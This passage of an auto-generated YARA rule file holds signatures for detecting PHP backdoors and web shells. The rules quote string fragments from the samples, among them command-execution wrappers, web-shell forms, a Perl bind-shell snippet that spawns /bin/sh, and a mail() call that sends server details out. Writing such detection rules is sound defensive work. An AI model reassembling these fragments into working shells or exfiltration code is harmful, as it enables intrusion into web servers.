      $s7 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']);" fullword ascii /* score: '14.00'*/
      $s8 = "if( $mode & 0x800 ) $owner[\"execute\"] = ($owner['execute']=='x') ? 's' : 'S';" fullword ascii /* score: '14.00'*/
      $s9 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']);" fullword ascii /* score: '14.00'*/
      $s10 = "$owner[\"read\"] = ($mode & 00400) ? 'r' : '-';" fullword ascii /* score: '7.00'*/
      $s11 = "$group[\"read\"] = ($mode & 00040) ? 'r' : '-';" fullword ascii /* score: '7.00'*/
      $s12 = "$world[\"read\"] = ($mode & 00004) ? 'r' : '-';" fullword ascii /* score: '7.00'*/
      $s13 = "$arr = array_merge($arr, glob(\".*\"));" fullword ascii /* score: '4.00'*/
      $s14 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword ascii /* score: '4.00'*/
      $s15 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword ascii /* score: '4.00'*/
      $s16 = "if( $mode & 0x1000 ) { $type='p'; }" fullword ascii /* score: '4.00'*/
      $s17 = "$group[\"write\"] = ($mode & 00020) ? 'w' : '-';" fullword ascii /* score: '4.00'*/
      $s18 = "$servsoft = $_SERVER['SERVER_SOFTWARE'];" fullword ascii /* score: '4.00'*/
      $s19 = "$dires = $dires . $directory;" fullword ascii /* score: '4.00'*/
      $s20 = "$arr = array_unique($arr);" fullword ascii /* score: '4.00'*/
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbb3f ) and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_nst_f__65876ca1dde6_backdoor_php_ekinoxshell_b__078d640f9105_backdoor_php_nst_e__191d8129e87e_5 {
   meta:
      description = "php__loose__php - from files backdoor_php_nst_f__65876ca1dde6, backdoor_php_ekinoxshell_b__078d640f9105, backdoor_php_nst_e__191d8129e87e"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash2 = "078d640f91054935e266c5152077675946697c77df05559474b4eedcabbea0d9"
      hash3 = "191d8129e87ea59d8a147802d27b4275f649b99eea5f548e5e8301ab443c3002"
   strings:
      $s1 = "} elseif (($perms & 0x1000) == 0x1000) {" fullword ascii /* score: '4.00'*/
      $s2 = "} elseif (($perms & 0xA000) == 0xA000) {" fullword ascii /* score: '4.00'*/
      $s3 = "$info .= (($perms & 0x0020) ? 'r' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "$info .= (($perms & 0x0002) ? 'w' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "} elseif (($perms & 0x4000) == 0x4000) {" fullword ascii /* score: '4.00'*/
      $s6 = "} elseif (($perms & 0x8000) == 0x8000) {" fullword ascii /* score: '4.00'*/
      $s7 = "$info .= (($perms & 0x0008) ?" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "if (($perms & 0xC000) == 0xC000) {" fullword ascii /* score: '4.00'*/
      $s9 = "$info .= (($perms & 0x0010) ? 'w' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "$info .= (($perms & 0x0040) ?" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "} elseif (($perms & 0x6000) == 0x6000) {" fullword ascii /* score: '4.00'*/
      $s12 = "} elseif (($perms & 0x2000) == 0x2000) {" fullword ascii /* score: '4.00'*/
      $s13 = "$info .= (($perms & 0x0100) ? 'r' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "$info .= (($perms & 0x0080) ? 'w' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "$info .= (($perms & 0x0001) ?" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x2020 ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_nst_f__65876ca1dde6_backdoor_php_nst_e__191d8129e87e_backdoor_php_cybershell_a__525501caeffb_6 {
   meta:
      description = "php__loose__php - from files backdoor_php_nst_f__65876ca1dde6, backdoor_php_nst_e__191d8129e87e, backdoor_php_cybershell_a__525501caeffb"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash2 = "191d8129e87ea59d8a147802d27b4275f649b99eea5f548e5e8301ab443c3002"
      hash3 = "525501caeffbf6547d4a0bb2e79b4b59d1a72343282c1c8b4a66f2352ea674b0"
   strings:
      $s1 = "header(\"Content-type: image/gif\");" fullword ascii /* score: '14.00'*/
      $s2 = "if(@$_GET['rename']){" fullword ascii /* score: '9.00'*/
      $s3 = "@$rto=$_POST['rto'];" fullword ascii /* score: '9.00'*/
      $s4 = "UNKNOWN {" fullword ascii /* score: '4.00'*/
      $s5 = "$dirs=array();" fullword ascii /* score: '4.00'*/
      $s6 = "$files=array();" fullword ascii /* score: '4.00'*/
      $s7 = "COLOR: #FF0C0B;" fullword ascii /* score: '4.00'*/
      $s8 = "SCROLLBAR-ARROW-COLOR: #363d4e;" fullword ascii /* score: '4.00'*/
      $s9 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword ascii /* score: '4.00'*/
      $s10 = "SCROLLBAR-SHADOW-COLOR: #363d4e;" fullword ascii /* score: '4.00'*/
      $s11 = "rename($fr1,$to1);" fullword ascii /* score: '4.00'*/
      $s12 = "<input type=submit value=RENAME>" fullword ascii /* score: '4.00'*/
      $s13 = "SCROLLBAR-FACE-COLOR: #363d4e;" fullword ascii /* score: '4.00'*/
      $s14 = "BODY, TD, TR {" fullword ascii /* score: '4.00'*/
      $s15 = "echo $copyr;" fullword ascii /* score: '4.00'*/
      $s16 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword ascii /* score: '4.00'*/
      $s17 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword ascii /* score: '4.00'*/
      $s18 = "COLOR: #0006DE;" fullword ascii /* score: '4.00'*/
      $s19 = "input, textarea, select {" fullword ascii /* score: '4.00'*/
      $s20 = "$fr1=str_replace(\"//\",\"/\",$fr1);" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_bluehat_g__b3c5c56ed159_backdoor_php_kaiowas__90f27e2313f4_7 {
   meta:
      description = "php__loose__php - from files backdoor_php_bluehat_g__b3c5c56ed159, backdoor_php_kaiowas__90f27e2313f4"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "b3c5c56ed1596c39048e98255cd9d667c272f1114e40200a75dadd4737d8379c"
      hash2 = "90f27e2313f47a12cf7b445cd09ef2b9ef19f8ddfcd112360fd4b8fc201b5919"
   strings:
      $s1 = "elseif(function_exists('shell_exec')){" fullword ascii /* score: '14.00'*/
      $s2 = "$res = @ob_get_contents();" fullword ascii /* score: '14.00'*/
      $s3 = "$res = @shell_exec($cfe);" fullword ascii /* score: '14.00'*/
      $s4 = "@exec($cfe,$res);" fullword ascii /* score: '12.00'*/
      $s5 = "if(function_exists('exec')){" fullword ascii /* score: '12.00'*/
      $s6 = "$eseguicmd=ex($cmd);" fullword ascii /* score: '9.00'*/
      $s7 = "$dir = @getcwd();" fullword ascii /* score: '9.00'*/
      $s8 = "@system($cfe);" fullword ascii /* score: '7.00'*/
      $s9 = "while(!@feof($f)) { $res .= @fread($f,1024); }" fullword ascii /* score: '7.00'*/
      $s10 = "echo $eseguicmd;" fullword ascii /* score: '7.00'*/
      $s11 = "@passthru($cfe);" fullword ascii /* score: '7.00'*/
      $s12 = "elseif(function_exists('system')){" fullword ascii /* score: '7.00'*/
      $s13 = "elseif(function_exists('passthru')){" fullword ascii /* score: '7.00'*/
      $s14 = "$cmd=\"id\";" fullword ascii /* score: '6.00'*/
      $s15 = "function ex($cfe){" fullword ascii /* score: '4.00'*/
      $s16 = "elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 .\" MB\";} " fullword ascii /* score: '4.00'*/
      $s17 = "elseif ($size >= 1024) {$size = round($size/1024*100)/100 .\" KB\";} " fullword ascii /* score: '4.00'*/
      $s18 = "if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 .\" GB\";} " fullword ascii /* score: '4.00'*/
      $s19 = "else {$size = $size . \" B\";} " fullword ascii /* score: '4.00'*/
      $s20 = "if (!empty($cfe)){" fullword ascii /* score: '4.00'*/
   condition:
      ( ( uint16(0) == 0x3e3f or uint16(0) == 0x3f3c ) and filesize < 5KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_kscr_a__1b8ff30fbeb9_backdoor_php_dive__fac5f1968c7b_8 {
   meta:
      description = "php__loose__php - from files backdoor_php_kscr_a__1b8ff30fbeb9, backdoor_php_dive__fac5f1968c7b"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "1b8ff30fbeb9c2dee26d9c11ecc82f0026daae7897db9cc19d37e905adcde9c6"
      hash2 = "fac5f1968c7bb59e35ce79699670236c68a32a3864bcdd8fc64fc838a7ad32c2"
   strings:
      $s1 = "  document.shell.command.focus();" fullword ascii /* score: '21.00'*/
      $s2 = "  document.shell.output.scrollTop = document.shell.output.scrollHeight;" fullword ascii /* score: '13.00'*/
      $s3 = "  document.shell.setAttribute(\"autocomplete\", \"off\");" fullword ascii /* score: '12.00'*/
      $s4 = "  var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword ascii /* score: '12.00'*/
      $s5 = "$padding = str_repeat(\"\\n\", max(0, $_REQUEST['rows']+1 - $lines));" fullword ascii /* score: '12.00'*/
      $s6 = "    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . \"\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "    array_unshift($_SESSION['history'], $_REQUEST['command']);" fullword ascii /* score: '10.00'*/
      $s8 = "    $js_command_hist = '\"\"';" fullword ascii /* score: '7.00'*/
      $s9 = "      $_REQUEST['command'] = stripslashes($_REQUEST['command']);" fullword ascii /* score: '7.00'*/
      $s10 = "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {" fullword ascii /* score: '7.00'*/
      $s11 = "echo rtrim($padding . $_SESSION['output']);" fullword ascii /* score: '7.00'*/
      $s12 = "    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword ascii /* score: '7.00'*/
      $s13 = "    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {" fullword ascii /* score: '7.00'*/
      $s14 = "$lines = substr_count($_SESSION['output'], \"\\n\");" fullword ascii /* score: '7.00'*/
      $s15 = "    $_SESSION['cwd'] = getcwd();" fullword ascii /* score: '7.00'*/
      $s16 = "  var last = 0;" fullword ascii /* score: '4.00'*/
      $s17 = "    if (get_magic_quotes_gpc()) {" fullword ascii /* score: '4.00'*/
      $s18 = "  var current_line = 0;" fullword ascii /* score: '4.00'*/
      $s19 = "    $js_command_hist = '\"\", \"' . implode('\", \"', $escaped) . '\"';" fullword ascii /* score: '3.00'*/
      $s20 = "    $_SESSION['history'] = array();" fullword ascii /* score: '2.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_loaders_a_b__63a7b9625ecd_backdoor_php_cybershell_a__525501caeffb_9 {
   meta:
      description = "php__loose__php - from files backdoor_php_loaders_a_b__63a7b9625ecd, backdoor_php_cybershell_a__525501caeffb"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "63a7b9625ecdfe253befe8a061a8d3d9e1475eb8f36d54f67dfc63bb410f0277"
      hash2 = "525501caeffbf6547d4a0bb2e79b4b59d1a72343282c1c8b4a66f2352ea674b0"
   strings:
      $s1 = "exec(\\\"/bin/sh\\\");" fullword ascii /* score: '15.00'*/
      $s2 = "bind(S, sockaddr_in(\\$port, INADDR_ANY));" fullword ascii /* score: '10.00'*/
      $s3 = "\\$port = \\$ARGV[0] if \\$ARGV[0];" fullword ascii /* score: '8.00'*/
      $s4 = "listen(S, 50);" fullword ascii /* score: '7.00'*/
      $s5 = "open STDIN, \\\"<&X\\\";" fullword ascii /* score: '7.00'*/
      $s6 = "\\$SIG{CHLD} = 'IGNORE';" fullword ascii /* score: '5.00'*/
      $s7 = "open STDOUT, \\\">&X\\\";" fullword ascii /* score: '4.00'*/
      $s8 = "socket(S, PF_INET, SOCK_STREAM, 0);" fullword ascii /* score: '4.00'*/
      $s9 = "exit if fork;" fullword ascii /* score: '4.00'*/
      $s10 = "setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);" fullword ascii /* score: '4.00'*/
      $s11 = "accept(X, S);" fullword ascii /* score: '4.00'*/
      $s12 = "open STDERR, \\\">&X\\\";" fullword ascii /* score: '4.00'*/
      $s13 = "close X;" fullword ascii /* score: '4.00'*/
      $s14 = "unless(fork)" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_matamumat_a__91a8a7a68a96_backdoor_php_agent_martingeisler__474607cb320f_10 {
   meta:
      description = "php__loose__php - from files backdoor_php_matamumat_a__91a8a7a68a96, backdoor_php_agent_martingeisler__474607cb320f"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91a8a7a68a966b89feeabc887a84f5302daf379cc6feef3a58b20122f43004ef"
      hash2 = "474607cb320fdc62a1a3628e9eb8a0313ac399c9fea085b38a8990cecfb63991"
   strings:
      $s1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii /* score: '28.00'*/
      $s2 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\">" fullword ascii /* score: '12.00'*/
      $s3 = "<form name=\"myform\" action=\"<?php echo $PHP_SELF ?>\" method=\"post\">" fullword ascii /* score: '9.00'*/
      $s4 = "<textarea cols=\"80\" rows=\"20\" readonly>" fullword ascii /* score: '7.00'*/
      $s5 = "<select name=\"work_dir\" onChange=\"this.form.submit()\">" fullword ascii /* score: '4.00'*/
      $s6 = "<p>Enable <code>stderr</code>-trapping? <input type=\"checkbox\" name=\"stderr\"></p>" fullword ascii /* score: '4.00'*/
      $s7 = "</select></p>" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "<p>Choose new working directory:" fullword ascii /* score: '4.00'*/
      $s9 = "<p>Current working directory: <b>" fullword ascii /* score: '4.00'*/
      $s10 = "<script language=\"JavaScript\" type=\"text/javascript\">" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s11 = "?></b></p>" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_xkn_a__cdadd3591bd1_backdoor_php_agent_martingeisler__474607cb320f_11 {
   meta:
      description = "php__loose__php - from files backdoor_php_xkn_a__cdadd3591bd1, backdoor_php_agent_martingeisler__474607cb320f"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "cdadd3591bd11387f78dd14160db7775878141d58efe232d34590da1d1c6f0e1"
      hash2 = "474607cb320fdc62a1a3628e9eb8a0313ac399c9fea085b38a8990cecfb63991"
   strings:
      $s1 = "extract($HTTP_POST_VARS);" fullword ascii /* score: '12.00'*/
      $s2 = "unset($command);" fullword ascii /* score: '12.00'*/
      $s3 = "extract($HTTP_GET_VARS);" fullword ascii /* score: '12.00'*/
      $s4 = "extract($HTTP_SERVER_VARS);" fullword ascii /* score: '7.00'*/
      $s5 = "if (file_exists($new_dir) && is_dir($new_dir)) {" fullword ascii /* score: '7.00'*/
      $s6 = "for ($i = 0; $i < count($work_dir_splitted); $i++) {" fullword ascii /* score: '4.00'*/
      $s7 = "chdir($work_dir);" fullword ascii /* score: '4.00'*/
      $s8 = "if ($stderr) {" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _backdoor_php_xkn_a__cdadd3591bd1_backdoor_php_ayyildiztim__12b46dabe382_backdoor_php_matamumat_a__91a8a7a68a96_12 {
   meta:
      description = "php__loose__php - from files backdoor_php_xkn_a__cdadd3591bd1, backdoor_php_ayyildiztim__12b46dabe382, backdoor_php_matamumat_a__91a8a7a68a96"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "cdadd3591bd11387f78dd14160db7775878141d58efe232d34590da1d1c6f0e1"
      hash2 = "12b46dabe382f7a8ea7f54eacf1412c7c3e7ba864e0000ee936dac29681ef307"
      hash3 = "91a8a7a68a966b89feeabc887a84f5302daf379cc6feef3a58b20122f43004ef"
   strings:
      $s1 = "    $tmpfile = tempnam('/tmp', 'phpshell');" fullword ascii /* score: '11.00'*/
      $s2 = "    $command .= ' -F';" fullword ascii /* score: '11.00'*/
      $s3 = "if (ini_get('register_globals') != '1') {" fullword ascii /* score: '9.00'*/
      $s4 = "    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword ascii /* score: '7.00'*/
      $s5 = "echo \"<option value=\\\"$work_dir/$dir\\\">$dir</option>\\n\";" fullword ascii /* score: '4.00'*/
      $s6 = "echo \"<option value=\\\"$work_dir$dir\\\">$dir</option>\\n\";" fullword ascii /* score: '4.00'*/
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x683c ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _backdoor_php_ayyildiztim__12b46dabe382_backdoor_php_matamumat_a__91a8a7a68a96_backdoor_php_agent_martingeisler__474607cb320_13 {
   meta:
      description = "php__loose__php - from files backdoor_php_ayyildiztim__12b46dabe382, backdoor_php_matamumat_a__91a8a7a68a96, backdoor_php_agent_martingeisler__474607cb320f"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "12b46dabe382f7a8ea7f54eacf1412c7c3e7ba864e0000ee936dac29681ef307"
      hash2 = "91a8a7a68a966b89feeabc887a84f5302daf379cc6feef3a58b20122f43004ef"
      hash3 = "474607cb320fdc62a1a3628e9eb8a0313ac399c9fea085b38a8990cecfb63991"
   strings:
      $s1 = "/* Run through all the files and directories to find the dirs. */" fullword ascii /* score: '11.00'*/
      $s2 = "/* Now we make a list of the directories. */" fullword ascii /* score: '8.00'*/
      $s3 = "/* First we check if there has been asked for a working directory. */" fullword ascii /* score: '8.00'*/
      $s4 = "/* The last / in work_dir were the first charecter." fullword ascii /* score: '8.00'*/
      $s5 = "if (file_exists($work_dir) && is_dir($work_dir)) {" fullword ascii /* score: '7.00'*/
      $s6 = "if (!empty($work_dir)) {" fullword ascii /* score: '4.00'*/
      $s7 = "if (!empty($work_dir_splitted[0])) {" fullword ascii /* score: '4.00'*/
   condition:
      ( ( uint16(0) == 0x683c or uint16(0) == 0x3f3c ) and filesize < 30KB and ( all of them )
      ) or ( all of them )
}

rule _backdoor_php_zaco_a__641927f65903_backdoor_php_myshell_a_a__80dd2cc4e630_backdoor_php_cybershell_a__525501caeffb_14 {
   meta:
      description = "php__loose__php - from files backdoor_php_zaco_a__641927f65903, backdoor_php_myshell_a_a__80dd2cc4e630, backdoor_php_cybershell_a__525501caeffb"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "641927f65903334707c32c58f1dd7b4e4ccd4982ca461281ba1cf5b36c52c9f5"
      hash2 = "80dd2cc4e630bdee9a92d5c89d502908211e0bb8f1b7d524355d59829d41933d"
      hash3 = "525501caeffbf6547d4a0bb2e79b4b59d1a72343282c1c8b4a66f2352ea674b0"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii /* score: '26.00'*/
      $s2 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii /* score: '14.00'*/
      $s3 = "$_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g3" ascii /* score: '13.00'*/
      $s4 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii /* score: '10.00'*/
      $s5 = "2 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\\n$b33\\n$c87\\n$d23\\n$e09\\n$f23\\n$g32\\n$h65\";" ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _backdoor_php_notfilefusion__9084a38bca04_backdoor_php_nst_f__65876ca1dde6_backdoor_php_nst_e__191d8129e87e_15 {
   meta:
      description = "php__loose__php - from files backdoor_php_notfilefusion__9084a38bca04, backdoor_php_nst_f__65876ca1dde6, backdoor_php_nst_e__191d8129e87e"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "9084a38bca04b46cdd1f7ffebbbe9f54b81bdd84dcabab167022f4149aefff19"
      hash2 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash3 = "191d8129e87ea59d8a147802d27b4275f649b99eea5f548e5e8301ab443c3002"
   strings:
      $s1 = "foreach($tabs as $tab) {" fullword ascii /* score: '4.00'*/
      $s2 = "$values = array_values($row);" fullword ascii /* score: '4.00'*/
      $s3 = "$row = mysql_fetch_row($res);" fullword ascii /* score: '4.00'*/
      $s4 = "$values = implode(\"', '\", $values);" fullword ascii /* score: '4.00'*/
      $s5 = "$result = mysql_query($query);" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( ( uint16(0) == 0x0d20 or uint16(0) == 0x3f3c ) and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

